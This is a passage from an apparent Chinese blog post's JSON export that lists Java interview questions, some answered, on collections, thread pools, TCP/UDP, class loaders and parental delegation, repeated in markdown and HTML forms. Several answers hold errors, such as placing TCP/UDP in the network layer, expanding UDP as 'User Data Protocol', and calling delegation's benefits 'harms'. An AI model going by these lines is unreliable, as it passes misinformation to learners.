ArrayList是不同步的，也就是不是线程安全的类\n\t* Vector是同步的，线程安全\n\n#### 14、TreeSet对存入的数据有什么要求吗？\n\n#### 15、HashSet是不是线程安全的\n\n#### 16、Java中有哪些线程安全的Map\n\n#### 17、CocurrentHashMap是怎么做到线程安全的\n\n#### 18、如何保证线程安全问题\n\n#### 19、volatile原子性问题？为什么i++不支持原子性\n\n#### 20、CAS操作\n\n#### 21、lock和synchronized区别\n\n#### 22、公平锁和非公平锁\n\n#### 23、Java读写锁，读写锁解决的问题\n\n#### 24、线程池的原理，为什么要创建线程池？创建线程池的方式？\n\n使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能\n\n#### 25、线程的生命周期，什么时候会出现僵死进程？\n\n#### 26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\n\n#### 27、volatile、ThreadLocal的使用场景和原理\n\n#### 28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\n\n#### 29、JVM内存模型、GC机制和原理\n\n#### 30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\n\n#### 31、JVM里有几种classloader，为什么会有多种。\n\nJVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。\n\n他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。\n\n当执行java \\*.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。\n\n#### 32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\n\n双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。\n\n采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。\n\n#### 33、什么情况下需要破坏双亲委派机制\n\n1、基础类调用用户代码\n\n双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。\n\n为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。\n\n2、OSGi模块化热部署\n\nOSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。\n\n\n#### 34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\n\n#### 35、红黑树的实现原理和应用场景\n\n#### 36、NIO是什么，适用于何种场景\n\n#### 37、八种基本数据类型的大小，以及他们的封装类\n\nbyte、short、int、char、float、double、long、boolean\n1、2、4、2、4、8、8、1\nByte、Short、Integer、Character、Float、Double、Long、Boolean\n\n#### 38、引用数据类型\n\n类、接口类型、数组类型、枚举类型、注解类型\n\n基本数据类型在创建时，在栈上给其划分一块内存，将数值直接存储在栈上。\n引用数据类型在创建时，首先在栈上给其引用分配一块内存，而对象的具体信息都存储在堆内存中，然后由栈上的引用指向堆中对象的地址。\n\n#### 39、switch能否用string做参数\n\njdk7之前只能用byte、short、char、int这几个基本数据类型和其对应的封装类型。switch后面的括号内只能放置int类型的数据，由于byte、short、char都可以自动转为int类型，所以可以支持。\n\njdk7之后整形、枚举类型、字符串都可以，但是jdk7并没有新的指令处理switch string，而是通过string.hashcode，将string转换为int进行判断。\n\n#### 40、equals和==的区别\n\n1、使用==比较原生类型如 boolean、int、char等，使用equals比较对象\n2、==是判断两个变量或者实例是不是指向同一个内存空间。equals是判断两个变量或者实例所指向的内存空间的值是不是相同\n3、==是指对内存地址进行比较，equals是对字符串的内容进行比较\n4、==是指引用是否相同，equals指的是值是否相同。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/Java面试题.md","raw":"---\ntitle: Java面试题\ndate: 2018-11-02 11:18:14\ntags: ['java','面试']\ncategories: 面试\n---\n\n#### 1、HashMap和HashTable区别\nHashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能\n\n* HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；\n* HashMap允许将null作为key或value，hashtable不允许；\n* HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；\n* 由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；\n* HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。\n* HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey\n* HashTable中数组默认大小是11，扩容方法是old\\*2+1;HashMap默认大小是16，扩容每次为2的指数大小\n\n#### 2、Object的hashcode方法，equals方法，常用的地方\n\n#### 3、HashMap的原理应用场景\n\n简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。\n\n#### 4、JDK中有哪些线程池\n\nJava中通过Executors提供四种线程池：\n* newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。\n* newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待\n* newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行\n* newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）\n\n#### 5、TCP/UDP区别\n\n**相同点**： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。\n\n| \t|               TCP \t\t\t\t\t  |                UDP   \t\t\t\t|\n|---|-----------------------------------------|-------------------------------------|\n|1\t|Transmission Control Protocol 传输控制协议| User Data Protocol 用户数据报协议 \t| \n|2\t|TCP的传输是可靠传输\t\t\t\t\t\t  | UDP的传输是不可靠传输               \t|\n|3  |TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接|UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去|\n|4  |TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信|UDP是一种不可靠的网络服务，负载相对较小|\n|5  |TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息|UDP包含长度和检验和信息|\n|6  |TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端 |UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端|\n|7  |TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢|UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快|\n|8  |TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制|UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境|\n\n\n#### 6、查找一个数组的中位数\n\n#### 7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\n\n#### 8、Object类中的方法\n\n#### 9、对象比较是否相等\n\n#### 10、toString方法的常用地方，为什么要重写该方法\n\n#### 11、HashMap put方法怎么判断是否是重复方法\n\n#### 12、Set和List的区别\n\n#### 13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\n\n* ArrayList和LinkedList区别：\n\t* ArrayList内部是基于数组实现的，因此对于随机访问快，新增删除慢\n\t* LinkedList内部是基于链表实现的，因此新增删除快，随机访问慢。\n* List和Map的区别：\n\t* List是存储单列数据的集合，存储的数据都是有序并且是可以重复的\n\t* Map是存储双列数据的集合，通过键值对存储数据，存储的数据是无序的，Key值不能重复，value值是可以重复的。\n* ArrayList和Vector的区别：\n\t* ArrayList是不同步的，也就是不是线程安全的类\n\t* Vector是同步的，线程安全\n\n#### 14、TreeSet对存入的数据有什么要求吗？\n\n#### 15、HashSet是不是线程安全的\n\n#### 16、Java中有哪些线程安全的Map\n\n#### 17、CocurrentHashMap是怎么做到线程安全的\n\n#### 18、如何保证线程安全问题\n\n#### 19、volatile原子性问题？为什么i++不支持原子性\n\n#### 20、CAS操作\n\n#### 21、lock和synchronized区别\n\n#### 22、公平锁和非公平锁\n\n#### 23、Java读写锁，读写锁解决的问题\n\n#### 24、线程池的原理，为什么要创建线程池？创建线程池的方式？\n\n使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能\n\n#### 25、线程的生命周期，什么时候会出现僵死进程？\n\n#### 26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\n\n#### 27、volatile、ThreadLocal的使用场景和原理\n\n#### 28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\n\n#### 29、JVM内存模型、GC机制和原理\n\n#### 30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\n\n#### 31、JVM里有几种classloader，为什么会有多种。\n\nJVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。\n\n他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。\n\n当执行java \\*.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。\n\n#### 32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\n\n双亲委派模式的工作原理是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器。如果父加载器可以完成加载任务，就成功返回；如果如果父加载器无法完成加载任务，子加载器才会尝试自己去加载，这就是双亲委托模型。\n\n采用双亲委派模型的害处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系，通过这种层级关系可以避免类的重复加载，当父亲已经加载了该类时，就没有必要子ClassLoader再加载一次。其次是考虑到安全因素，java核心api中定义类型不会随意被替换，比如通过网络传递一个java.lang.Integer的类，通过双亲委派模型传递到父类加载器，而启动类加载器在核心Java API中已经发现了这个类，所以并不会加载网络传递过来的Java.lang.Integer，而是直接返回已经加载过的Integer，这样便可以防止核心API被人随意篡改。\n\n#### 33、什么情况下需要破坏双亲委派机制\n\n1、基础类调用用户代码\n\n双亲委派很好地解决了各个类加载器的基础类的同一问题（越基础的类由越上层的加载器进行加载），基础类之所以称为“基础”，是因为它们总是作为被用户代码调用的API，但世事往往没有绝对的完美。如果基础类又要调用回用户的代码，那该么办？一个典型的例子就是JNDI服务，JNDI服务现在已经是Java的标准服务。JNDI的目的是对资源进行集中管理和查找，但是它需要调用有独立厂商实现并部署在应用程序ClassPath下的JNDI接口提供者（如mysql连接驱动、sql连接驱动）的代码，但是启动类加载器不识别这些代码。\n\n为了解决这个问题，Java设计团队引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。有了线程上下文类加载器，JNDI就可以使用它去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载的动作，这种行为实际上打破了双薪委派模型层次结构来逆向使用类加载器。JAVA中所有涉及SPI的加载动作基本上都是采用这种方式，例如JNDI、JDBC、JCE、JAXB等。\n\n2、OSGi模块化热部署\n\nOSGI实现模块化热部署的关键是它自定义的类加载器机制的实现，每一个程序模块都有一个自己的类加载器，当需要等换一个模块时，就把模块连同类加载器一起换掉以实现代码的热替换。\n\n\n#### 34、常见的JVM调优方法有哪些？可以调整哪个参数，调成什么值。\n\n#### 35、红黑树的实现原理和应用场景\n\n#### 36、NIO是什么，适用于何种场景\n\n#### 37、八种基本数据类型的大小，以及他们的封装类\n\nbyte、short、int、char、float、double、long、boolean\n1、2、4、2、4、8、8、1\nByte、Short、Integer、Character、Float、Double、Long、Boolean\n\n#### 38、引用数据类型\n\n类、接口类型、数组类型、枚举类型、注解类型\n\n基本数据类型在创建时，在栈上给其划分一块内存，将数值直接存储在栈上。\n引用数据类型在创建时，首先在栈上给其引用分配一块内存，而对象的具体信息都存储在堆内存中，然后由栈上的引用指向堆中对象的地址。\n\n#### 39、switch能否用string做参数\n\njdk7之前只能用byte、short、char、int这几个基本数据类型和其对应的封装类型。switch后面的括号内只能放置int类型的数据，由于byte、short、char都可以自动转为int类型，所以可以支持。\n\njdk7之后整形、枚举类型、字符串都可以，但是jdk7并没有新的指令处理switch string，而是通过string.hashcode，将string转换为int进行判断。\n\n#### 40、equals和==的区别\n\n1、使用==比较原生类型如 boolean、int、char等，使用equals比较对象\n2、==是判断两个变量或者实例是不是指向同一个内存空间。equals是判断两个变量或者实例所指向的内存空间的值是不是相同\n3、==是指对内存地址进行比较，equals是对字符串的内容进行比较\n4、==是指引用是否相同，equals指的是值是否相同。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"Java面试题","published":1,"updated":"2019-07-31T06:45:59.424Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mf004do25t2rn6hn7k","content":"<h4 id=\"1、HashMap和HashTable区别\"><a href=\"#1、HashMap和HashTable区别\" class=\"headerlink\" title=\"1、HashMap和HashTable区别\"></a>1、HashMap和HashTable区别</h4><p>HashMap是HashTable的轻量实现（非线程安全），他们都实现的Map接口，主要区别在于：线程安全，同步，性能</p>\n<ul>\n<li>HashTable继承Dictionary，HashMap继承的是java2出现的Map接口；</li>\n<li>HashMap允许将null作为key或value，hashtable不允许；</li>\n<li>HashMap是非同步的，HashTable是同步的(synchronized),所以HashMap线程不安全，而HashTable是线程安全的，多个线程可以共享一个HashTbale而不需要为自己的方法实现同步。Java5提供了ConcurrentMap，用来替代HashTable，比HashTable扩展性好；</li>\n<li>由于HashMap是非线程安全的，所以单一线程访问，HashMap性能要高于HashTable；</li>\n<li>HashMap的迭代器（Iterator）是fail-fast迭代器，HashTable的enumerator迭代器不是fail-fast的。</li>\n<li>HashMap把HashTable的contains方法去掉了，换成了containsValue和containsKey</li>\n<li>HashTable中数组默认大小是11，扩容方法是old*2+1;HashMap默认大小是16，扩容每次为2的指数大小</li>\n</ul>\n<h4 id=\"2、Object的hashcode方法，equals方法，常用的地方\"><a href=\"#2、Object的hashcode方法，equals方法，常用的地方\" class=\"headerlink\" title=\"2、Object的hashcode方法，equals方法，常用的地方\"></a>2、Object的hashcode方法，equals方法，常用的地方</h4><h4 id=\"3、HashMap的原理应用场景\"><a href=\"#3、HashMap的原理应用场景\" class=\"headerlink\" title=\"3、HashMap的原理应用场景\"></a>3、HashMap的原理应用场景</h4><p>简单的说，HashMap是由数组和链表组成的，主体是数组，链表的作用主要是为了解决哈希冲突而存在的。在JDK1.8之后，链表长度超过8之后，会转换为红黑树。HashMap的默认容量为16，阈值为0.75，总容量超过0.75时，会进行2倍扩容。</p>\n<h4 id=\"4、JDK中有哪些线程池\"><a href=\"#4、JDK中有哪些线程池\" class=\"headerlink\" title=\"4、JDK中有哪些线程池\"></a>4、JDK中有哪些线程池</h4><p>Java中通过Executors提供四种线程池：</p>\n<ul>\n<li>newCachedTheadPool： 创建一个可缓存的线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无回收，则创建线程。此线程池不会对线程池大小做限制，线程池大小完全依赖系统能够创建的最大线程大小。</li>\n<li>newFixedThreadPool： 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待</li>\n<li>newScheduleThreadPool： 创建一个定长线程池，支持定时及周期性任务执行</li>\n<li>newSingleThreadExecutor： 创建一个单线程化的线程池，他只会用唯一的工作线程来执行任务，保证所有任务按照先定顺序（FIFO，LIFO优先级执行）</li>\n</ul>\n<h4 id=\"5、TCP-UDP区别\"><a href=\"#5、TCP-UDP区别\" class=\"headerlink\" title=\"5、TCP/UDP区别\"></a>5、TCP/UDP区别</h4><p><strong>相同点</strong>： 都处于OSI七层模型的网络层，都是传输层协议，都能保护网络层的传输，双方通信都需要开放端口。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>TCP</th>\n<th>UDP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>Transmission Control Protocol 传输控制协议</td>\n<td>User Data Protocol 用户数据报协议</td>\n</tr>\n<tr>\n<td>2</td>\n<td>TCP的传输是可靠传输</td>\n<td>UDP的传输是不可靠传输</td>\n</tr>\n<tr>\n<td>3</td>\n<td>TCP是基于连接的协议，在正式收发数据前，必须和对方建立可靠的连接</td>\n<td>UDP是和TCP相对应的协议，他是面向非连接的协议，他不与对方建立连接，而是直接把数据包发送出去</td>\n</tr>\n<tr>\n<td>4</td>\n<td>TCP是一种可靠的通信服务，负载相对而言比较大，TCP用套接字(socket)或者端口进行通信</td>\n<td>UDP是一种不可靠的网络服务，负载相对较小</td>\n</tr>\n<tr>\n<td>5</td>\n<td>TCP和UP的结构不同，TCP包括序号、确认信号、数据偏移、控制标志(通常URG、ACK、PSH、RST、SYN、FIN)、窗口、检验和、紧急指针、选项等信息</td>\n<td>UDP包含长度和检验和信息</td>\n</tr>\n<tr>\n<td>6</td>\n<td>TCP提供超时重发，丢弃重复数据，检验数据，流量控制等，保证数据从一端传到另一端</td>\n<td>UDP不提供可靠性，他只是把应用程序传给IP层的数据发送出去，但是不能保证他们到达目的端</td>\n</tr>\n<tr>\n<td>7</td>\n<td>TCP发送数据包前会在通信双方间建立三次握手，确保双方准备好，在传输数据包期间，TCP会根据链路中数据流量的大小来调节传送的速率，传输时如果发现有丢包，会有严格的重传机制，故而传输速度很慢</td>\n<td>UDP在传输数据报前不用在客户端和服务器之间建立连接，且没有超时重发机制，故而传输速度很快</td>\n</tr>\n<tr>\n<td>8</td>\n<td>TCP支持全双工和并发的TCP连接，提供确认、重传、拥塞控制</td>\n<td>UDP适用于对系统性能要求高于数据完整性的要求，需要简短快捷的数据交换、需要多播和广播的应用环境</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"6、查找一个数组的中位数\"><a href=\"#6、查找一个数组的中位数\" class=\"headerlink\" title=\"6、查找一个数组的中位数\"></a>6、查找一个数组的中位数</h4><h4 id=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"><a href=\"#7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\" class=\"headerlink\" title=\"7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。\"></a>7、反射的机制，说说反射的用途和实现，反射是不是很慢，我们在项目中是否应该避免使用反射。</h4><h4 id=\"8、Object类中的方法\"><a href=\"#8、Object类中的方法\" class=\"headerlink\" title=\"8、Object类中的方法\"></a>8、Object类中的方法</h4><h4 id=\"9、对象比较是否相等\"><a href=\"#9、对象比较是否相等\" class=\"headerlink\" title=\"9、对象比较是否相等\"></a>9、对象比较是否相等</h4><h4 id=\"10、toString方法的常用地方，为什么要重写该方法\"><a href=\"#10、toString方法的常用地方，为什么要重写该方法\" class=\"headerlink\" title=\"10、toString方法的常用地方，为什么要重写该方法\"></a>10、toString方法的常用地方，为什么要重写该方法</h4><h4 id=\"11、HashMap-put方法怎么判断是否是重复方法\"><a href=\"#11、HashMap-put方法怎么判断是否是重复方法\" class=\"headerlink\" title=\"11、HashMap put方法怎么判断是否是重复方法\"></a>11、HashMap put方法怎么判断是否是重复方法</h4><h4 id=\"12、Set和List的区别\"><a href=\"#12、Set和List的区别\" class=\"headerlink\" title=\"12、Set和List的区别\"></a>12、Set和List的区别</h4><h4 id=\"13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\"><a href=\"#13、ArrayList和LinkedList的区别，List和Map的区别，-ArrayList和Vector的区别\" class=\"headerlink\" title=\"13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别\"></a>13、ArrayList和LinkedList的区别，List和Map的区别， ArrayList和Vector的区别</h4><ul>\n<li>ArrayList和LinkedList区别：<ul>\n<li>ArrayList内部是基于数组实现的，因此对于随机访问快，新增删除慢</li>\n<li>LinkedList内部是基于链表实现的，因此新增删除快，随机访问慢。</li>\n</ul>\n</li>\n<li>List和Map的区别：<ul>\n<li>List是存储单列数据的集合，存储的数据都是有序并且是可以重复的</li>\n<li>Map是存储双列数据的集合，通过键值对存储数据，存储的数据是无序的，Key值不能重复，value值是可以重复的。</li>\n</ul>\n</li>\n<li>ArrayList和Vector的区别：<ul>\n<li>ArrayList是不同步的，也就是不是线程安全的类</li>\n<li>Vector是同步的，线程安全</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"14、TreeSet对存入的数据有什么要求吗？\"><a href=\"#14、TreeSet对存入的数据有什么要求吗？\" class=\"headerlink\" title=\"14、TreeSet对存入的数据有什么要求吗？\"></a>14、TreeSet对存入的数据有什么要求吗？</h4><h4 id=\"15、HashSet是不是线程安全的\"><a href=\"#15、HashSet是不是线程安全的\" class=\"headerlink\" title=\"15、HashSet是不是线程安全的\"></a>15、HashSet是不是线程安全的</h4><h4 id=\"16、Java中有哪些线程安全的Map\"><a href=\"#16、Java中有哪些线程安全的Map\" class=\"headerlink\" title=\"16、Java中有哪些线程安全的Map\"></a>16、Java中有哪些线程安全的Map</h4><h4 id=\"17、CocurrentHashMap是怎么做到线程安全的\"><a href=\"#17、CocurrentHashMap是怎么做到线程安全的\" class=\"headerlink\" title=\"17、CocurrentHashMap是怎么做到线程安全的\"></a>17、CocurrentHashMap是怎么做到线程安全的</h4><h4 id=\"18、如何保证线程安全问题\"><a href=\"#18、如何保证线程安全问题\" class=\"headerlink\" title=\"18、如何保证线程安全问题\"></a>18、如何保证线程安全问题</h4><h4 id=\"19、volatile原子性问题？为什么i-不支持原子性\"><a href=\"#19、volatile原子性问题？为什么i-不支持原子性\" class=\"headerlink\" title=\"19、volatile原子性问题？为什么i++不支持原子性\"></a>19、volatile原子性问题？为什么i++不支持原子性</h4><h4 id=\"20、CAS操作\"><a href=\"#20、CAS操作\" class=\"headerlink\" title=\"20、CAS操作\"></a>20、CAS操作</h4><h4 id=\"21、lock和synchronized区别\"><a href=\"#21、lock和synchronized区别\" class=\"headerlink\" title=\"21、lock和synchronized区别\"></a>21、lock和synchronized区别</h4><h4 id=\"22、公平锁和非公平锁\"><a href=\"#22、公平锁和非公平锁\" class=\"headerlink\" title=\"22、公平锁和非公平锁\"></a>22、公平锁和非公平锁</h4><h4 id=\"23、Java读写锁，读写锁解决的问题\"><a href=\"#23、Java读写锁，读写锁解决的问题\" class=\"headerlink\" title=\"23、Java读写锁，读写锁解决的问题\"></a>23、Java读写锁，读写锁解决的问题</h4><h4 id=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"><a href=\"#24、线程池的原理，为什么要创建线程池？创建线程池的方式？\" class=\"headerlink\" title=\"24、线程池的原理，为什么要创建线程池？创建线程池的方式？\"></a>24、线程池的原理，为什么要创建线程池？创建线程池的方式？</h4><p>使用线程池的好处： 线程可以重复利用，减少创建、销毁线程带来的系统资源的开销，提高性能</p>\n<h4 id=\"25、线程的生命周期，什么时候会出现僵死进程？\"><a href=\"#25、线程的生命周期，什么时候会出现僵死进程？\" class=\"headerlink\" title=\"25、线程的生命周期，什么时候会出现僵死进程？\"></a>25、线程的生命周期，什么时候会出现僵死进程？</h4><h4 id=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"><a href=\"#26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\" class=\"headerlink\" title=\"26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？\"></a>26、创建线程池有哪几个核心参数，如何合理配置线程池的大小？</h4><h4 id=\"27、volatile、ThreadLocal的使用场景和原理\"><a href=\"#27、volatile、ThreadLocal的使用场景和原理\" class=\"headerlink\" title=\"27、volatile、ThreadLocal的使用场景和原理\"></a>27、volatile、ThreadLocal的使用场景和原理</h4><h4 id=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"><a href=\"#28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\" class=\"headerlink\" title=\"28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。\"></a>28、Synchronized、Volatile区别，Synchronized锁粒度，模拟死锁场景、原子性与可见性。</h4><h4 id=\"29、JVM内存模型、GC机制和原理\"><a href=\"#29、JVM内存模型、GC机制和原理\" class=\"headerlink\" title=\"29、JVM内存模型、GC机制和原理\"></a>29、JVM内存模型、GC机制和原理</h4><h4 id=\"30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\"><a href=\"#30、GC分那两种，Minor-GC和Full-GC有什么区别，什么情况下会触发Full-GC，分别采用什么算法。\" class=\"headerlink\" title=\"30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。\"></a>30、GC分那两种，Minor GC和Full GC有什么区别，什么情况下会触发Full GC，分别采用什么算法。</h4><h4 id=\"31、JVM里有几种classloader，为什么会有多种。\"><a href=\"#31、JVM里有几种classloader，为什么会有多种。\" class=\"headerlink\" title=\"31、JVM里有几种classloader，为什么会有多种。\"></a>31、JVM里有几种classloader，为什么会有多种。</h4><p>JVM里有三种类加载器：BootStrap Loader 负责加载系统类，ExtClassLoader负责加载扩展类，AppClassLoader负责加载应用类。</p>\n<p>他们的分工不一样，各自负责不同的区域，另外也是为了实现委托模型。</p>\n<p>当执行java *.class的时候，java会帮助我们找到jre，接着找到jre内部的jvm.dll，这个才是真正的java虚拟机，最后加载动态库，激活java虚拟机。虚拟机激活后，会先做一些初始化的动作，比如读取系统参数，一旦初始化动作完成，就会产生第一个类加载器-Bootstrap Loader，Bootstrap Loader是由C++编写的，该Loader所做的初始化工作中，除了一些基本的初始化动作之外，最重要的就是加载Launcher.java中的ExtClassLoader，并设定其parent为null，但其实其父加载器就是Bootstrap Loader。然后Bootstrap Loader在要求加载Launcher.java中的AppClassLoader，并设定其Parent为ExtClassLoader。需要注意的是Launcher$ExtClassLoader和Launcher$AppClassLoader都是由BootstrapLoader加载的，所以Parent和由哪个类加载没有关系。</p>\n<h4 id=\"32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\"><a href=\"#32、什么是双亲委派机制，介绍双亲委派的运作过程和好处\" 